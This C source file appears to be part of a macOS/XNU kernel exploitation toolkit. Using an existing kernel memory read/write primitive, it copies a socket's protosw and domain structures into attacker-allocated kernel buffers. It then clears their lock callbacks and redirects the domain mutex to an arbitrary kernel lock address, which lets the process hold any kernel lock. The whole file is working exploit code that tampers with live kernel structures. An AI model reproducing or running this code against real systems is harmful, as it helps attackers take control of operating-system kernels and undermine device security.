//
//  xe_util_lock.c
//  xe
//
//  Created by admin on 11/21/21.
//

#include <assert.h>
#include <stdlib.h>
#include <unistd.h>

#include <sys/fcntl.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/errno.h>
#include <arpa/inet.h>
#include <dispatch/dispatch.h>

#include "util_lock.h"
#include "kmem.h"
#include "xnu_proc.h"
#include "xnu_socket.h"
#include "allocator_pipe.h"
#include "platform_types.h"


struct xe_util_lock {
    int fd;
    struct sockaddr_un saddr;
    xe_allocator_pipe_t protosw_allocator;
    xe_allocator_pipe_t domain_allocator;
};


int xe_util_lock_lock(uintptr_t kernproc, uintptr_t lock, xe_util_lock_t* util_out) {
    xe_allocator_pipe_t protosw_allocator = NULL;
    xe_allocator_pipe_t domain_allocator = NULL;
    
    int fd = socket(PF_LOCAL, SOCK_STREAM, 0);
    if (fd < 0) {
        return errno;
    }
    
    uintptr_t protosw_buffer;
    int error = xe_kmem_allocator_pipe_allocate(kernproc, TYPE_PROTOSW_SIZE, &protosw_allocator, &protosw_buffer);
    if (error) {
        return error;
    }
    
    uintptr_t domain_buffer;
    error = xe_kmem_allocator_pipe_allocate(kernproc, TYPE_DOMAIN_SIZE, &domain_allocator, &domain_buffer);
    if (error) {
        return error;
    }
    
    uintptr_t proc;
    error = xe_xnu_proc_current_proc(kernproc, &proc);
    assert(error == 0);
    
    uintptr_t socket;
    error = xe_xnu_proc_find_fd_data(proc, fd, &socket);
    assert(error == 0);
    
    printf("[DEBUG] proc: %p\n", (void*)proc);
    
    uintptr_t protosw = xe_xnu_socket_get_so_proto(socket);
    xe_kmem_copy(protosw_buffer, protosw, TYPE_PROTOSW_SIZE);
    xe_xnu_socket_protosw_set_pr_lock(protosw_buffer, 0);
    xe_xnu_socket_protosw_set_pr_getlock(protosw_buffer, 0);
    xe_xnu_socket_protosw_set_pr_unlock(protosw_buffer, 0);
    uintptr_t domain = xe_xnu_socket_protosw_get_pr_domain(protosw_buffer);
    xe_kmem_copy(domain_buffer, domain, TYPE_DOMAIN_SIZE);
    xe_xnu_socket_protosw_set_pr_domain(protosw_buffer, domain_buffer);
    xe_xnu_socket_domain_set_dom_mtx(domain_buffer, lock);
    xe_xnu_socket_set_so_proto(socket, protosw_buffer);
    
    struct sockaddr_un addr;
    bzero(&addr, sizeof(addr));
    addr.sun_family = AF_LOCAL;
    addr.sun_len = sizeof(addr);
    snprintf(addr.sun_path, sizeof(addr.sun_path), "/tmp/xe_%ld.sock", random());
    
    if (bind(fd, (struct sockaddr*)&addr, sizeof(addr))) {
        error = errno;
        goto exit_error;
    }
    
    if (listen(fd, 10)) {
        error = errno;
        goto exit_error;
    };
    
    dispatch_async(&_dispatch_main_q, ^() {
        struct sockaddr in;
        socklen_t in_len;
        if (accept(fd, &in, &in_len)) {
            printf("accept failed, err: %d\n", errno);
        }
    });
    
    xe_util_lock_t util = (xe_util_lock_t)malloc(sizeof(struct xe_util_lock));
    if (!util) {
        error = ENOMEM;
        goto exit_error;
    }
    
    util->fd = fd;
    util->saddr = addr;
    util->protosw_allocator = protosw_allocator;
    util->domain_allocator = domain_allocator;
    
    *util_out = util;
    return 0;
    
exit_error:
    close(fd);
    unlink(addr.sun_path);
    
    if (protosw_allocator) {
        xe_kmem_allocator_pipe_destroy(&protosw_allocator);
    }
    if (domain_allocator) {
        xe_kmem_allocator_pipe_destroy(&domain_allocator);
    }
    
    return error;
}


int xe_util_lock_destroy(xe_util_lock_t* util) {
    if (util == NULL || *util == NULL) {
        return EINVAL;
    }
    
    if (close((*util)->fd)) {
        return errno;
    }
    
    unlink((*util)->saddr.sun_path);
    xe_kmem_allocator_pipe_destroy(&(*util)->protosw_allocator);
    xe_kmem_allocator_pipe_destroy(&(*util)->domain_allocator);
    
    free(*util);
    *util = NULL;
    return 0;
}
